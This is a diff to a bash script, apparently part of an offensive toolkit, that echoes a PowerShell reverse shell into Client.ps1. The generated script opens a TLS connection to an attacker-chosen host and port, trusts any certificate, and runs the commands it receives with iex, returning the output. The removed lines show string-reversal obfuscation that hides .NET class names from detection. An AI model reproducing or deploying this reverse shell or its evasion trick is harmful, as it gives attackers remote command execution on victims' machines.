@@ -13989,19 +13989,7 @@ SysCall2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length2)
 syscallvar2="\$$SysCall2"
 
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
-echo "" > $IPATH/output/Client.ps1
-echo "\$SSLStreamTls = \"gnidocnEiicsA.txeT.metsyS\";" >> $IPATH/output/Client.ps1
-echo "\$CharArray = \$SSLStreamTls.ToCharArray();" >> $IPATH/output/Client.ps1
-echo "[Array]::Reverse(\$CharArray);" >> $IPATH/output/Client.ps1
-echo "$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
-echo "" >> $IPATH/output/Client.ps1
-echo "\$VoidBuff = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/Client.ps1
-echo "\$Cert = \$VoidBuff.ToCharArray();" >> $IPATH/output/Client.ps1
-echo "[Array]::Reverse(\$Cert);" >> $IPATH/output/Client.ps1
-echo "$syscallvar = (\$Cert -Join '');" >> $IPATH/output/Client.ps1
-echo "" >> $IPATH/output/Client.ps1
-echo "" >> $IPATH/output/Client.ps1
-echo "\$socket = New-Object $syscallvar('$lhost', $lport)" >> $IPATH/output/Client.ps1
+echo "\$socket = New-Object Net.Sockets.TcpClient('$lhost', $lport)" > $IPATH/output/Client.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
@@ -14010,7 +13998,7 @@ echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $I
 echo "        \$writer.flush();[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
-echo "   \$data = (New-Object -TypeName $syscallvar2).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
+echo "   \$data = (New-Object -TypeName System.Text.AsciiEncoding).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
 echo "   \$sendback2 = \$sendback + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/Client.ps1
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/Client.ps1
